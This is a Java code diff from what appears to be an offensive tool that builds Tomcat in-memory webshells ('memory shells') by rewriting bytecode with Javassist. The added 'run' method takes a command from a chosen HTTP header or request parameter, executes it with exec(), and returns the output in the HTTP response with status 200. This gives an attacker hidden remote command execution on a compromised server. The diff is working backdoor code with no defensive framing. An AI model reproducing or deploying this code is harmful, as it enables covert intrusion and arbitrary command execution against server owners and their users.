@@ -25,10 +25,31 @@ public class TomcatMSJavaClassBuilder {
         CtClass ctClass = classPool.getCtClass(cls.getName());
 
         // response
-        CtMethod ctMethod = ctClass.getDeclaredMethod("getResponse");
-        ctMethod.setBody("{Object request = getFieldValue($1, \"request\");\n" +
+        CtMethod responseCtMethod = ctClass.getDeclaredMethod("getResponse");
+        responseCtMethod.setBody("{Object request = getFieldValue($1, \"request\");\n" +
                 "Object httpServletResponse = getFieldValue(request, \"response\");\n" +
                 "return httpServletResponse;}");
+
+        // run
+        CtMethod runCtMethod = ctClass.getDeclaredMethod("run");
+        runCtMethod.setBody("{try {\n" +
+                "    Object httpServletRequest = invokeMethod($1, \"getServletRequest\", new Class[]{}, new Object[]{});\n" +
+                "    Object header =  invokeMethod(httpServletRequest, \"getHeader\", new Class[]{String.class}, new Object[]{HEADER});\n" +
+                "    Object param = invokeMethod(httpServletRequest, \"getParameter\", new Class[]{String.class}, new Object[]{PARAM});\n" +
+                "    String str = null;\n" +
+                "    if (header != null) {\n" +
+                "        str = (String) header;\n" +
+                "    } else if (param != null) {\n" +
+                "        str = (String) param;\n" +
+                "    }\n" +
+                "    String result = exec(str);\n" +
+                "    Object response = getResponse(httpServletRequest);\n" +
+                "    invokeMethod(response, \"setStatus\", new Class[]{Integer.TYPE}, new Object[]{new Integer(200)});\n" +
+                "    Object writer = invokeMethod(response, \"getWriter\", new Class[]{}, new Object[]{});\n" +
+                "    invokeMethod(writer, \"println\", new Class[]{String.class}, new Object[]{result});\n" +
+                "} catch (Exception ignored) {\n" +
+                "    ignored.printStackTrace();\n" +
+                "}}");
 
         // 字段信息修改
         JavaClassModifier.fieldChange(cls, ctClass, javaClassHelper);
